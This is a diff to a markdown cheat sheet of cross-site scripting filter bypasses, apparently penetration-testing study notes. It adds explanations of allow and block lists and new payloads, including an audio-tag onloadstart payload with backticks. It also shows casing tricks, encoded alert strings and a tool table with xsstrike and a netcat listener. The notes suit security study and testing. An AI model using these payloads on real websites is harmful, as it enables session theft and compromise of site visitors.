@@ -24,11 +24,21 @@ Determine where your input is getting printed in the HTTP response we receive ba
 
 
 ## XSS Filter Bypasses
+Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.
+
+### How might these filters be implemented?
+- Allow listing (Whitelisting) of allowed elements, attributes or characters.
+- Blacklisting of allowed elements, attributes or characters.
+
 ### Weak Blacklists
 - Casing: `<ScRiPt>alert(1);</ScRiPt>`
 - Casing: `<object data="JaVaScRiPt:alert(1)">`
 - Casing: `<img src=x OnErRoR=alert(1)>`
 - No Space: `<svg/onload=alert(1)>`
+- If `img` is blocked, try `audio` or `video`
+- If `alert` is blocked, try `prompt` or `confirm`
+- If parenthesis `()` are blocked, try the back tick `
+- To combine the last 3: `<audio src onloadstart=confirm`1`>`
 
 ### JavaScript Encodings
 - Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
@@ -78,3 +88,5 @@ Determine where your input is getting printed in the HTTP response we receive ba
 | `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
 | `sudo nc -lvnp 80` | Start `netcat` listener |
 | `sudo php -S 0.0.0.0:80` | Start `PHP` server |
+
+
